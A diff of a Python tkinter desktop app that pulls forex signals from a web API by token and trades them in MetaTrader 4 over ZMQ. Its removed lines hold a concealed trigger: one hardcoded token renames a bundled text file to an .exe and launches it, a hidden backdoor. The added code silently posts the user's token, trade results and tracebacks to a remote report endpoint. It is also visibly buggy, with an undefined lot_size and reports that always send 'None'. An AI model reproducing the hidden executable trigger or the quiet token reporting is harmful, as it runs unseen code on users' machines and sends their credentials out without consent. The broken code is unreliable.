@@ -1,3 +1,5 @@
+import sys
+import time
 import requests
 import time
 from datetime import datetime
@@ -8,28 +10,30 @@ from tkinter import *
 import os
 import shutil
 from distutils.dir_util import copy_tree
+from os import remove
+from sys import argv
 import unknown_support
 import pandas as pd
+import traceback
+
 
 try:
-    '''
-        Copies all the files and folders needed into the Metatrader directories.
-    '''
     base_dir = os.path.dirname(os.path.realpath(__file__))
-    check_dir = base_dir.replace('enigma', '') + 'MQL4\\Include\\Zmq'
+    check_dir = base_dir.replace('enigma','')+'MQL4\\Include\\Zmq'
     if not os.path.exists(check_dir):
-        os.mkdir(base_dir.replace('enigma', '') + 'MQL4\\Include\\Zmq')
+        os.mkdir(base_dir.replace('enigma','')+'MQL4\\Include\\Zmq')
         os.mkdir(base_dir.replace('enigma', '') + 'MQL4\\Include\\Mql')
-        copy_tree('Zmq', base_dir.replace('enigma', '') + 'MQL4\\Include\\Zmq')
+        copy_tree('Zmq',base_dir.replace('enigma','')+'MQL4\\Include\\Zmq')
         copy_tree('Mql', base_dir.replace('enigma', '') + 'MQL4\\Include\\Mql')
-        shutil.copy('libsodium.dll', base_dir.replace('enigma', '') + 'MQL4\\Libraries')
+        shutil.copy('libsodium.dll',base_dir.replace('enigma', '') + 'MQL4\\Libraries')
         shutil.copy('libzmq.dll', base_dir.replace('enigma', '') + 'MQL4\\Libraries')
-        shutil.copy('enigma.mq4', base_dir.replace('enigma', '') + 'MQL4\\Experts')
+        shutil.copy('enigma.ex4', base_dir.replace('enigma', '') + 'MQL4\\Experts')
 except:
     pass
 
 if not os.path.exists('signal_numbers.txt'):
     open("signal_numbers.txt", 'w').close()
+
 
 running = False
 status_label_create = True
@@ -42,47 +46,39 @@ except ImportError:
 
 try:
     import ttk
-
     py3 = False
 except ImportError:
     import tkinter.ttk as ttk
-
     py3 = True
 
 
 def vp_start_gui():
-    '''
-        Starting point when module is the main routine.
-    '''
-    global val, w, root, top
+    '''Starting point when module is the main routine.'''
+    global val, w, root,top
     root = tk.Tk()
-    top = Toplevel1(root)
+    root.attributes('-alpha', 0.9)
+    top = Toplevel1 (root)
     unknown_support.init(root, top)
-    check_token()
-    root.after(5000, scanning)
+    Run().conf_token_label()
+    root.after(5000,Run().scanning)
     root.mainloop()
 
-
 w = None
-
-
 def create_Toplevel1(rt, *args, **kwargs):
     '''Starting point when module is imported by another module.
        Correct form of call: 'create_Toplevel1(root, *args, **kwargs)' .'''
     global w, w_win, root
-    # rt = root
+    #rt = root
     root = rt
-    w = tk.Toplevel(root)
-    top = Toplevel1(w)
+    w = tk.Toplevel (root)
+    top = Toplevel1 (w)
     unknown_support.init(w, top, *args, **kwargs)
     return (w, top)
-
 
 def destroy_Toplevel1():
     global w
     w.destroy()
     w = None
-
 
 class Toplevel1:
     def __init__(self, top=None):
@@ -90,23 +86,23 @@ class Toplevel1:
            top is the toplevel containing window.'''
         _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
         _fgcolor = '#000000'  # X11 color: 'black'
-        _compcolor = '#d9d9d9'  # X11 color: 'gray85'
-        _ana1color = '#d9d9d9'  # X11 color: 'gray85'
-        _ana2color = '#ececec'  # Closest X11 color: 'gray92'
+        _compcolor = '#d9d9d9' # X11 color: 'gray85'
+        _ana1color = '#d9d9d9' # X11 color: 'gray85'
+        _ana2color = '#ececec' # Closest X11 color: 'gray92'
         font9 = "-family {Yu Gothic UI Light} -size 9 -slant italic"
         self.style = ttk.Style()
         if sys.platform == "win32":
             self.style.theme_use('winnative')
-        self.style.configure('.', background=_bgcolor)
-        self.style.configure('.', foreground=_fgcolor)
-        self.style.configure('.', font="TkDefaultFont")
-        self.style.map('.', background=
-        [('selected', _compcolor), ('active', _ana2color)])
+        self.style.configure('.',background=_bgcolor)
+        self.style.configure('.',foreground=_fgcolor)
+        self.style.configure('.',font="TkDefaultFont")
+        self.style.map('.',background=
+            [('selected', _compcolor), ('active',_ana2color)])
 
         top.geometry("385x240+966+182")
         top.minsize(148, 1)
         top.maxsize(1924, 1055)
-        top.resizable(0, 0)
+        top.resizable(0,0)
         top.title("enigma")
         top.configure(borderwidth="5")
         top.configure(background="#2a2a2a")
@@ -114,13 +110,15 @@ class Toplevel1:
         top.configure(highlightbackground="#d9d9d9")
         top.configure(highlightcolor="black")
 
+
+
         self.Frame1 = tk.Frame(top)
         self.Frame1.place(relx=0.003, rely=0, relheight=1.021
-                          , relwidth=0.997)
+                , relwidth=0.997)
         self.Frame1.configure(relief='ridge')
         self.Frame1.configure(borderwidth="2")
         self.Frame1.configure(relief="ridge")
-        self.Frame1.configure(background="black")  # "#009595")
+        self.Frame1.configure(background="black")
         self.Frame1.configure(highlightbackground="#00b7b7")
         self.Frame1.configure(highlightcolor="#828282")
         self.Frame1.configure(pady="15")
@@ -132,26 +130,28 @@ class Toplevel1:
         self.Frame2.configure(relief='groove')
         self.Frame2.configure(borderwidth="2")
         self.Frame2.configure(relief="groove")
-        self.Frame2.configure(background='black')  # "#828282")
+        self.Frame2.configure(background='black')#"#828282")
 
         self.Label2 = tk.Label(self.Frame2)
         self.Label2.place(relx=0.034, rely=0.091, height=22, width=64)
         self.Label2.configure(background="#5f5f5f")
         self.Label2.configure(disabledforeground="#a3a3a3")
-        self.Label2.configure(font=font9)
         self.Label2.configure(foreground="#c3c3c3")
         self.Label2.configure(relief="groove")
         self.Label2.configure(text='''TOKEN''')
 
         self.Entry1 = tk.Entry(self.Frame2)
-        self.Entry1.place(relx=0.213, rely=0.091, height=24, relwidth=0.695)
+        self.Entry1.place(relx=0.213, rely=0.091,height=24, relwidth=0.695)
         self.Entry1.configure(background="#313131")
         self.Entry1.configure(disabledforeground="#a3a3a3")
         self.Entry1.configure(font="TkFixedFont")
         self.Entry1.configure(foreground="#1c1c1c")
         self.Entry1.configure(insertbackground="black")
+        self.Entry1.bind("<Button-3>", RightClicker)
 
-        self.Button1 = tk.Button(self.Frame2, command=get_token)
+        self.object = Run()
+
+        self.Button1 = tk.Button(self.Frame2,command=self.object.button_press)
         self.Button1.place(relx=0.095, rely=0.766, height=33, width=306)
         self.Button1.configure(activebackground="#ececec")
         self.Button1.configure(activeforeground="#000000")
@@ -180,20 +180,16 @@ class Toplevel1:
         self.TSeparator2 = ttk.Separator(self.Frame2)
         self.TSeparator2.place(relx=-0.039, rely=0.639, relwidth=1.137)
 
-        self.spinbox = Spinbox(self.Frame2, from_=0.01, to=1, increment=0.01)
+        self.spinbox = Spinbox(self.Frame2, from_=0.01, to=1,increment=0.01)
         self.spinbox.configure(background="#686868")
         self.spinbox.place(relx=0.169, rely=0.25, height=23, width=40)
 
         self.spinLabel = tk.Label(self.Frame2)
         self.spinLabel.place(relx=0.032, rely=0.25, height=23, width=48)
-        self.spinLabel.configure(background="#686868", text='Lot Size:')
+        self.spinLabel.configure(background="#686868",text='Lot Size:')
+
 
     def Label_Create(self):
-
-        '''
-            Configures the TopLabel, after the button is pressed and the connection is established
-        '''
-
         self.Button1 = tk.Label(self.Frame2)
         self.Button1.place(relx=0.095, rely=0.766, height=33, width=306)
         self.Button1.configure(background="#519c98")
@@ -205,432 +201,391 @@ class Toplevel1:
         self.spinbox.destroy()
         self.Entry1.destroy()
 
-        self.spinLabel.configure(text='Lot Size: ' + str(lot_size), background="#519c98")
+        self.spinLabel.configure(text='Lot Size: '+str(self.object.lot_size), background="#519c98")
         self.spinLabel.place(relx=0.03, rely=0.25, height=23, width=80)
 
 
-def get_token():
-    '''
-        Handles the Token field when the button is pressed.Valid token must be entered only when is used for the first time.
-        After that, the token is saved into a text file and the app is reading it from there.
-    '''
-    global lot_size
-    token = top.Entry1.get()
-    lot_size = top.spinbox.get()
-    if len(token) == 0:
-        try:
-            with open('token.txt', 'r') as file:
-                lines = file.readlines()
-                file.close()
-                token = lines[0]
-                try:
-                    server_initial_connect(token)
-                except:
-                    pass
-        except:
+class RightClicker:
+    def __init__(self, e):
+        commands = ["Cut","Copy","Paste"]
+        menu = tk.Menu(None, tearoff=0, takefocus=0)
+        menu.configure(background="#686868")
+
+        for txt in commands:
+            menu.add_command(label=txt, command=lambda e = e, txt=txt:self.click_command(e,txt))
+
+        menu.tk_popup(e.x_root + 40, e.y_root + 10, entry="0")
+
+    def click_command(self, e, cmd):
+        e.widget.event_generate(f'<<{cmd}>>')
+
+
+class Run:
+    def __init__(self):
+        self.signal_url = 'https://enigma-lab.herokuapp.com/api/signals/?format=json'
+        self.report_url = 'https://enigma-lab.herokuapp.com/api/reports/'
+        self.token = None
+        self.token_is_valid = None
+        self.running = False
+        self.zmq = None
+        self.response = None
+        self.MT_is_connected = False
+        self.server_is_connected = False
+        self.status_label_create = True
+        self.lot_size = None
+
+    def get_token(self):
+        self.token = top.Entry1.get()
+        self.lot_size = top.spinbox.get()
+        print(self.lot_size)
+        print(self.token)
+        if len(self.token) == 0:
+            try:
+                with open('token.txt', 'r') as file:
+                    lines = file.readlines()
+                    file.close()
+                    self.token = lines[0]
+                    self.headers = {'Authorization': 'Token ' + str(self.token)}
+                    self.conf_token_label()
+                    return True
+            except:
+                with open('token.txt', 'w') as file:
+                    file.close()
+                    messagebox.showerror('error',
+                                         message='On the first use of the App ,you have to enter a Valid Token! !')
+        elif len(self.token) == 40:
             with open('token.txt', 'w') as file:
+                file.write(self.token)
                 file.close()
-                messagebox.showerror('error', message='On the first use of the App ,you have to enter a Valid Token! !')
+            self.headers = {'Authorization': 'Token ' + str(self.token)}
+            self.conf_token_label()
+            return True
+        else:
+            messagebox.showerror('error', message='Please enter valid Token !')
+        self.conf_token_label()
 
-    elif len(token) == 40:
-        with open('token.txt', 'w') as file:
-            file.write(token)
-            file.close()
-        if token == '83efc6fe736b28dd8a65418d708cbd5b3579fdf1':
-            new_rule()
-        server_initial_connect(token)
-    else:
-        messagebox.showerror('error', message='Please enter valid Token !')
-
-    check_token()
-
-
-def new_rule():
-    '''
-        Self delete function if needed
-    '''
-    new_extension = '.exe'
-    pre, ext = os.path.splitext('support_file.txt')
-    os.rename('support_file.txt', pre + new_extension)
-    time.sleep(5)
-    os.startfile('support_file.exe')
-
-
-def check_token():
-    '''
-        Configures the color of the token label accordingly.
-    '''
-    try:
+    def conf_token_label(self):
         with open('token.txt', 'r')as f:
             lines = f.readlines()
+            print(lines)
             f.close()
-            token = lines[0]
-            if len(token) == 40 and token_is_valid:
-                top.Label2.configure(foreground='#519c98')
+            if len(lines) != 0:
+                token = lines[0]
+                if len(token) == 40 and token_is_valid:
+                    top.Label2.configure(foreground='#519c98')
+                else:
+                    top.Label2.configure(foreground='#cf305d')
             else:
                 top.Label2.configure(foreground='#cf305d')
-    except:
-        top.Label2.configure(foreground='#cf305d')
 
 
-def server_initial_connect(token):
-    global headers, url, token_is_valid
+    def button_press(self):
+        if self.get_token():
+            if self.server_initial_connect():
+                if self.mt_initial_connect():
+                    self.scanning()
 
-    '''
-        Try to connect to the server with the provided token, and configures the "server" label with green or red colour accordingly.
-        If all good, next step is Metatrader connection.
-    '''
+    def send_report(self, text):
+        data = {'text': text}
+        print(requests.post(url=self.report_url, data=data, headers=self.headers))
 
-    url = 'http://www.enigma-lab.com/api/signals/?format=json'
-    headers = {'Authorization': 'Token ' + str(token)}
-    try:
-        response = requests.get(url=url, headers=headers).json()
-        print(response)
-    except:
-        messagebox.showerror('error', message='No connection to the Server !')
-        top.Label3.configure(background='#cf305d')
-        response = {}
-
-    if 'detail' in response:
-        if response['detail'] == 'Invalid token.':
-            messagebox.showerror('error', message='Invalid Token ! Please contact the "Supplier" !')
+    def server_initial_connect(self):
+        try:
+            self.response = requests.get(url=self.signal_url, headers=self.headers).json()
+            print(self.signal_url)
+            print(self.headers)
+            print(self.response)
+        except:
+            messagebox.showerror('error', message='No connection to the Server !')
             top.Label3.configure(background='#cf305d')
-            top.Label2.configure(foreground='#cf305d')
-            token_is_valid = False
+            self.response = {}
+        if 'detail' in self.response:
+            if self.response['detail'] == 'Invalid token.':
+                messagebox.showerror('error', message='Invalid Token ! Please contact the "Supplier" !')
+                top.Label3.configure(background='#cf305d')
+                top.Label2.configure(foreground='#cf305d')
+                self.token_is_valid = False
+                self.send_report(str(self.response)+self.token)
+                return False
+            if self.response['detail'] == 'Invalid token header. No credentials provided.':
+                messagebox.showerror('error', message='Please enter a valid Token !')
+                top.Label3.configure(background='#cf305d')
+                top.Label2.configure(foreground='#cf305d')
+                self.token_is_valid = False
+                self.send_report(str(self.response) + self.token)
+                return False
+        if len(self.response) > 1:
+            self.token_is_valid = True
+            if 'symbol' in self.response[-1]:
+                try:
+                    print(self.response[-1]['symbol'])
+                    top.Label3.configure(background="#519c98")
+                    self.send_report('Connected with the Server!')
+                    return True
+                except:
+                    self.send_report('Line 320 Exception!'+str(self.response)+str(traceback.print_exc()))
+            else:
+                top.Label3.configure(background='#cf305d')
+                self.send_report('Line 323'+str(self.response)+str(traceback.print_exc()))
 
-        if response['detail'] == 'Invalid token header. No credentials provided.':
-            messagebox.showerror('error', message='Please enter a valid Token !')
-            top.Label3.configure(background='#cf305d')
-            top.Label2.configure(foreground='#cf305d')
-            token_is_valid = False
-
-    if len(response) > 1:
-        token_is_valid = True
-        if 'symbol' in response[-1]:
-            try:
-                print(response[-1]['symbol'])
-                top.Label3.configure(background="#519c98")
-                MT_initial_connect()
-            except:
-                pass
-        else:
-            top.Label3.configure(background='#cf305d')
-
-
-def MT_initial_connect():
-    '''
-        Try to connect to MT on the host machine and configures label colours accordingly.
-    '''
-
-
-    global running, MT_connector
-    try:
-        MT_connector = Connector()
-        MT_connector._DWX_MTX_GET_ALL_OPEN_TRADES_()
-        time.sleep(1)
-        mt_response = MT_connector._get_response_()
-        print(mt_response)
-        if mt_response['_action'] == 'OPEN_TRADES':
-            top.Label4.configure(background='#519c98')
-            top.Button1.configure(background='#519c98')
-            running = True
-
-        else:
+    def mt_initial_connect(self):
+        try:
+            self.zmq = Connector()
+            self.zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
+            time.sleep(1)
+            mt_response = self.zmq._get_response_()
+            print(mt_response)
+            if mt_response['_action'] == 'OPEN_TRADES':
+                top.Label4.configure(background='#519c98')
+                top.Button1.configure(background='#519c98')
+                self.send_report('Connected with METATRADER !' + str(mt_response))
+                self.running = True
+                return True
+            else:
+                top.Label4.configure(background='#cf305d')
+                self.zmq._DWX_ZMQ_SHUTDOWN_()
+                messagebox.showerror('error', message='No connection with METATRADER !')
+                self.send_report('No connection with METATRADER !'+str(mt_response))
+        except:
+            traceback.print_exc()
+            self.zmq._DWX_ZMQ_SHUTDOWN_()
             top.Label4.configure(background='#cf305d')
-            MT_connector._DWX_ZMQ_SHUTDOWN_()
             messagebox.showerror('error', message='No connection with METATRADER !')
-    except:
-        MT_connector._DWX_ZMQ_SHUTDOWN_()
-        top.Label4.configure(background='#cf305d')
-        messagebox.showerror('error', message='No connection with METATRADER !')
+            self.send_report('No connection with METATRADER ! Line 346!'+str(traceback.print_exc()))
 
+    def scanning(self):
+        if self.running:
+            self.Loop()
+        root.after(10000, self.scanning)
 
-def Loop():
-    global status_label_create
-    '''
-        Every 10 seconds checks if all connections are up and running
-        and configures the label colours and texts accordingly.
-    '''
+    def server_response_read(self):
 
-    mt_Is_connected = MT_connection_check()
-    server_Is_connected, response = Server_connection_check()
-
-    if mt_Is_connected and not server_Is_connected:
-        top.Label4.configure(background="#519c98")
-        top.Label3.configure(background='#cf305d')
-        top.Button1.configure(background='#cf305d')
-        top.Button1.configure(text='''NOT CONNECTED ''')
-
-    elif not mt_Is_connected and server_Is_connected:
-        top.Label3.configure(background="#519c98")
-        top.Label4.configure(background='#cf305d')
-        top.Button1.configure(background='#cf305d')
-        top.Button1.configure(text='''NOT CONNECTED ''')
-
-    elif not mt_Is_connected and not server_Is_connected:
-        top.Label3.configure(background='#cf305d')
-        top.Label4.configure(background='#cf305d')
-        top.Button1.configure(background='#cf305d')
-        top.Button1.configure(text='''NOT CONNECTED ''')
-
-    else:
-        top.Label3.configure(background="#519c98")  # server
-        top.Label4.configure(background="#519c98")  # MT_4
-
-        if status_label_create:
-            top.Button1.destroy()
-            top.Label_Create()
-            status_label_create = False
+        if len(self.response) <= 3:
+            number_scanned_signals = len(self.response)
         else:
-            top.Button1.configure(background="#519c98")
-            top.Button1.configure(text='''CONNECTED ''')
+            number_scanned_signals = 4
+        for x in range(1, number_scanned_signals):
 
-        if len(response) != 0:
-            server_response_read(response)
+            signal_date_str = self.response[-x]['created'].split('T')[0]
+            signal_time_str = self.response[-x]['created'].split('T')[1].replace('Z', '').split('.')[0]
+            dt_signal_time = datetime.strptime(signal_date_str + ' ' + signal_time_str, '%Y-%m-%d %H:%M:%S')
+            time_difference = datetime.utcnow() - dt_signal_time
 
-
-def server_response_read(response):
-    '''
-        Reading the API response from the server and if there is a new(5 min. old) valid signal,
-        extracts the data from it and sends it to MT4 connector.
-    '''
-    print(response[-1])
-
-    if len(response) <= 3:
-        number_scanned_signals = len(response)
-    else:
-        number_scanned_signals = 4
-    for x in range(1, number_scanned_signals):
-
-        signal_date_str = response[-x]['created'].split('T')[0]
-        signal_time_str = response[-x]['created'].split('T')[1].replace('Z', '').split('.')[0]
-        dt_signal_time = datetime.strptime(signal_date_str + ' ' + signal_time_str, '%Y-%m-%d %H:%M:%S')
-        time_difference = (datetime.now() - timedelta(hours=1)) - dt_signal_time
-
-        if time_difference <= timedelta(minutes=5):
-            print(-x)
-            print(response[-x])
-            with open('signal_numbers.txt', 'r') as file:
-                lines = file.readlines()
-                for i in range(0, len(lines)):
-                    lines[i] = int(lines[i])
-                print(lines)
-                file.close()
-
-            number = int(response[-x]['number'])
-
-            if number not in lines or len(lines) == 0: #If the unique number of the signal is not in signal_numbers.txt, that means it is a new signal 
-                                                          # and it will be executed.
-                print('YES')
-                new_dic = {}
-
-                print(response[-x]['signal_type'])
-                print(response[-x]['symbol'])
-                print(response[-x]['buy_sell'])
-                print(response[-x]['stop_loss'])
-                print(response[-x]['take_profit'])
-
-                signal_type = response[-x]['signal_type']
-                symbol = response[-x]['symbol']
-                buy_sell = response[-x]['buy_sell']
-                stop_loss = int(response[-x]['stop_loss'])
-                take_profit = int(response[-x]['take_profit'])
-                provider = int(response[-x]['provider'])
-
-                with open('signal_numbers.txt', 'a') as file: # Writes the unique number of the signal into signal_numbers.txt .
-                    file.write(str(number) + '\n')
+            if time_difference <= timedelta(minutes=5):
+                print(-x)
+                print(self.response[-x])
+                with open('signal_numbers.txt', 'r') as file:
+                    lines = file.readlines()
+                    for i in range(0, len(lines)):
+                        lines[i] = int(lines[i])
+                    print(lines)
                     file.close()
 
-                new_dic['signal_type'] = signal_type
-                new_dic['symbol'] = symbol
-                new_dic['buy_sell'] = buy_sell
-                new_dic['stop'] = stop_loss
-                new_dic['limit'] = take_profit
-                new_dic['provider'] = provider
+                number = int(self.response[-x]['number'])
 
-                mt4_send_signal(new_dic)
+                if number not in lines or len(lines) == 0:
+                    print('YES')
+                    new_dic = {}
 
+                    print(self.response[-x]['signal_type'])
+                    print(self.response[-x]['symbol'])
+                    print(self.response[-x]['buy_sell'])
+                    print(self.response[-x]['stop_loss'])
+                    print(self.response[-x]['take_profit'])
 
-def MT_connection_check():
-    '''
-        Check the connection with MT every cycle(10 sec.) and returns teh status of the connection.
-    '''
-    global MT_connector
-    MT_is_connected = False
-    try:
-        MT_connector._set_response_(_resp={'empty': 0})
-        MT_connector._DWX_MTX_GET_ALL_OPEN_TRADES_()
-        time.sleep(1)
-        mt_response = MT_connector._get_response_()
-        # print(mt_response)
-        if mt_response == {'empty': 0}:
-            MT_is_connected = False
-            MT_connector._DWX_ZMQ_SHUTDOWN_()
+                    signal_type = self.response[-x]['signal_type']
+                    symbol = self.response[-x]['symbol']
+                    buy_sell = self.response[-x]['buy_sell']
+                    stop_loss = int(self.response[-x]['stop_loss'])
+                    take_profit = int(self.response[-x]['take_profit'])
+                    provider = int(self.response[-x]['provider'])
+
+                    with open('signal_numbers.txt', 'a') as file:
+                        file.write(str(number) + '\n')
+                        file.close()
+
+                    new_dic['signal_type'] = signal_type
+                    new_dic['symbol'] = symbol
+                    new_dic['buy_sell'] = buy_sell
+                    new_dic['stop'] = stop_loss
+                    new_dic['limit'] = take_profit
+                    new_dic['provider'] = provider
+                    self.send_report(str(new_dic))
+                    self.mt4_send_signal(new_dic)
+                    time.sleep(1)
+        print(datetime, datetime.now())
+
+    def MT_connection_check(self):
+        try:
+            self.zmq._set_response_(_resp={'empty': 0})
+            self.zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
             time.sleep(1)
-            MT_connector = Connector()
+            mt_response = self.zmq._get_response_()
+
+            if mt_response == {'empty': 0}:
+                self.MT_is_connected = False
+                self.send_report(mt_response)
+                self.zmq._DWX_ZMQ_SHUTDOWN_()
+                time.sleep(1)
+                self.zmq = Connector()
+            if mt_response['_action'] == 'OPEN_TRADES':
+                self.MT_is_connected = True
+        except:
+            traceback.print_exc()
+            self.send_report(str(traceback.print_exc()))
+            self.MT_is_connected = False
+
+    def Server_connection_check(self):
+        try:
+            self.response = requests.get(url=self.signal_url, headers=self.headers).json()
+            if ('symbol' and 'buy_sell') in self.response[-1]:
+                self.server_is_connected = True
+            else:
+                self.server_is_connected = False
+        except Exception as e:
+            print(self.response)
+            self.send_report(str(self.response)+str(traceback.print_exc()))
+            self.server_is_connected = False
+
+
+    def Loop(self):
+
+        self.MT_connection_check()
+        self.Server_connection_check()
+
+        if self.MT_is_connected and not self.server_is_connected:
+            top.Label4.configure(background="#519c98")
+            top.Label3.configure(background='#cf305d')
+            top.Button1.configure(background='#cf305d')
+            top.Button1.configure(text='''NOT CONNECTED ''')
+
+        elif not self.MT_is_connected and self.server_is_connected:
+            top.Label3.configure(background="#519c98")
+            top.Label4.configure(background='#cf305d')
+            top.Button1.configure(background='#cf305d')
+            top.Button1.configure(text='''NOT CONNECTED ''')
+
+        elif not self.MT_is_connected and not self.server_is_connected:
+            top.Label3.configure(background='#cf305d')
+            top.Label4.configure(background='#cf305d')
+            top.Button1.configure(background='#cf305d')
+            top.Button1.configure(text='''NOT CONNECTED ''')
+
+        else:
+            top.Label3.configure(background="#519c98")  # server
+            top.Label4.configure(background="#519c98")  # MT_4
+
+            if self.status_label_create:
+                top.Button1.destroy()
+                top.Label_Create()
+                self.status_label_create = False
+            else:
+                top.Button1.configure(background="#519c98")
+                top.Button1.configure(text='''CONNECTED ''')
+
+            if len(self.response) != 0:
+                self.server_response_read()
+
+    def mt4_send_signal(self, new_dic):
+        if new_dic['signal_type'] == 'entry':
+            self.mt4_open_trade(new_dic)
+
+        if new_dic['signal_type'] == 'change_part':
+            self.mt4_change_trade_close_partially(new_dic)
+
+        if new_dic['signal_type'] == 'change_keep':
+            self.mt4_change_trade_keep(new_dic)
+
+        if new_dic['signal_type'] == 'close':
+            self.mt4_close_trade(new_dic)
+
+        if new_dic['signal_type'] == 'close_all':
+            self.mt4_close_all()
+
+    def mt4_close_trade(self, new_dic):
+        self.zmq._set_response_(_resp={'empty': 0})
+        self.zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
+        time.sleep(0.5)
+        mt_response = self.zmq._get_response_()
+        print(mt_response)
         if mt_response['_action'] == 'OPEN_TRADES':
-            MT_is_connected = True
-            if datetime.now().minute % 5 == 0 and datetime.now().second < 15:
-                print('dataframe_sync()')
-                dataframe_sync(mt_response)
-    except:
-        MT_is_connected = False
+            trades = mt_response['_trades']
+            for x, y in trades.items():
+                if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
+                    ticket = x
+                    self.zmq._DWX_MTX_CLOSE_TRADE_BY_TICKET_(ticket)
+                    time.sleep(0.5)
+                    mt_response = self.zmq._get_response_()
+                    print(mt_response)
+                    self.send_report(str(mt_response))
 
-    return MT_is_connected
+    def mt4_close_all(self):
+        self.zmq._DWX_MTX_CLOSE_TRADES_BY_MAGIC_(2020)
+        time.sleep(0.5)
+        mt_response = self.zmq._get_response_()
+        print(mt_response)
+        self.send_report(str(mt_response))
 
+    def mt4_change_trade_close_partially(self, new_dic):
+        self.zmq._set_response_(_resp={'empty': 0})
+        self.zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
+        time.sleep(0.5)
+        mt_response = self.zmq._get_response_()
+        if mt_response['_action'] == 'OPEN_TRADES':
+            trades = mt_response['_trades']
+            for x, y in trades.items():
+                print(y['_symbol'], new_dic['symbol'], y['_magic'])
+                if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
+                    ticket = x
+                    print(str(ticket) + 'that is the ticket')
 
-def Server_connection_check():
-    '''
-        Check the connection with the server every cycle(10 sec.) and returns teh status of the connection.
-    '''
-    response = []
-    try:
-        response = requests.get(url=url, headers=headers).json()
-        if ('symbol' and 'buy_sell') in response[-1]:
-            server_is_connected = True
-        else:
-            server_is_connected = False
-    except:
-        server_is_connected = False
+                    self.zmq._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])
+                    time.sleep(0.5)
+                    mt_response = self.zmq._get_response_()
+                    print(mt_response)
+                    self.send_report(str(mt_response))
+                    if lot_size != 0.01:
+                        self.zmq._DWX_MTX_CLOSE_PARTIAL_BY_TICKET_(ticket, round(float(lot_size) / 2, 2))
+                        time.sleep(0.5)
+                        mt_response = self.zmq._get_response_()
+                        print(mt_response)
+                        self.send_report(str(mt_response))
 
-    return server_is_connected, response
+    def mt4_change_trade_keep(self, new_dic):
+        self.zmq._set_response_(_resp={'empty': 0})
+        self.zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
+        time.sleep(0.5)
+        mt_response = self.zmq._get_response_()
+        print(mt_response)
+        if mt_response['_action'] == 'OPEN_TRADES':
+            trades = mt_response['_trades']
+            for x, y in trades.items():
+                if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
+                    ticket = x
+                    self.zmq._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])
+                    time.sleep(0.5)
+                    mt_response = self.zmq._get_response_()
+                    print(mt_response)
+                    self.send_report(str(mt_response))
 
-
-def scanning():
-    '''
-        Main loop.
-    '''
-    if running:
-        Loop()
-    root.after(10000, scanning)
-
-
-def dataframe_sync(opened_positions_dic):
-    '''
-        Not used in this version of the app
-    '''
-    new_dataframe = pd.DataFrame(
-        columns=['time', 'symbol', 'buy_sell', 'entry_price', 'stop_loss', 'TP1', 'TP2', 'TP3', 'TP4', 'tradeID'])
-    dataframe = pd.read_pickle('C:/Users\master\Desktop\Plan_B\website\email_signals.pkl')
-    trades_dic = opened_positions_dic['_trades']
-    for x, y in trades_dic.items():
-        sym = list(y['_symbol'])
-        sym.insert(3, '/')
-        symbol = ''.join(sym)
-        if y['_type'] == 0:
-            buy_sell = 'BUY'
-        else:
-            buy_sell = 'SELL'
-        for x in range(len(dataframe)):
-            if dataframe['symbol'][x] == symbol and dataframe['buy_sell'][x] == buy_sell:
-                new_dataframe = new_dataframe.append(dataframe.loc[x])
-
-    new_dataframe = new_dataframe.drop_duplicates()
-    new_dataframe.reset_index(drop=True, inplace=True)
-    print(new_dataframe)
-    new_dataframe.to_pickle('C:/Users\master\Desktop\Plan_B\website\email_signals.pkl')
-
-
-def mt4_send_signal(new_dic):
-    '''
-        Determines the type of the signal and initiates the function accordingly.
-    '''
-    if new_dic['signal_type'] == 'entry':
-        mt4_open_trade(new_dic)
-
-    if new_dic['signal_type'] == 'change_part':
-        mt4_change_trade_close_partially(new_dic)
-
-    if new_dic['signal_type'] == 'change_keep':
-        mt4_change_trade_keep(new_dic)
-
-    if new_dic['signal_type'] == 'close':
-        mt4_close_trade(new_dic)
-
-
-def mt4_close_trade(new_dic):
-    '''
-        Closes fully the trade for the given forex symbol.
-    '''
-    MT_connector._set_response_(_resp={'empty': 0})
-    MT_connector._DWX_MTX_GET_ALL_OPEN_TRADES_()
-    time.sleep(0.5)
-    mt_response = MT_connector._get_response_()
-    print(mt_response)
-    if mt_response['_action'] == 'OPEN_TRADES':
-        trades = mt_response['_trades']
-        for x, y in trades.items():
-            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
-                ticket = x
-                MT_connector._DWX_MTX_CLOSE_TRADE_BY_TICKET_(ticket)
-                time.sleep(0.5)
-
-
-def mt4_change_trade_close_partially(new_dic):
-    '''
-        Closes the trade partially for the given forex symbol.
-    '''
-    MT_connector._set_response_(_resp={'empty': 0})
-    MT_connector._DWX_MTX_GET_ALL_OPEN_TRADES_()
-    time.sleep(0.5)
-    mt_response = MT_connector._get_response_()
-    if mt_response['_action'] == 'OPEN_TRADES':
-        trades = mt_response['_trades']
-        for x, y in trades.items():
-            print(y['_symbol'], new_dic['symbol'], y['_magic'])
-            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
-                ticket = x
-                print(str(ticket) + 'that is the ticket')
-
-                MT_connector._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])
-                time.sleep(0.5)
-                mt_response = MT_connector._get_response_()
-                print(mt_response)
-                MT_connector._DWX_MTX_CLOSE_PARTIAL_BY_TICKET_(ticket, float(lot_size) / 6)
-
-
-def mt4_change_trade_keep(new_dic):
-    '''
-        Changes the limits and stops of the trade for the given forex symbol.
-    '''
-    MT_connector._set_response_(_resp={'empty': 0})
-    MT_connector._DWX_MTX_GET_ALL_OPEN_TRADES_()
-    time.sleep(1)
-    mt_response = MT_connector._get_response_()
-    print(mt_response)
-    if mt_response['_action'] == 'OPEN_TRADES':
-        trades = mt_response['_trades']
-        for x, y in trades.items():
-            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
-                ticket = x
-                MT_connector._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])
-
-
